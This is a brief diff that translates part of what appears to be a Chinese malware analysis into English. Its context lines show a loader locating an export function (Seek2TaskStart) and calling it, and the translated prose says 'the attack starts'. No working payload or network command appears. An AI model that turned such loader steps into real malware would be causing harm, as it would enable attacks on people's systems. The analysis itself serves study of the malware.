-这部分代码就是在搜索导出函数表。
+This part of the code is in the search export function table.
 
 
 ```C++
@@ -1203,7 +1204,7 @@ fpTaskStart = Seek2TaskStart(pPeBuilder, szTaskStart);
               fpTaskStart(0, 0);
 ```
 
-调用导出函数，攻击开始。
+Call the export function, the attack starts.
 
 
-## second phase ##
+## phase two ##
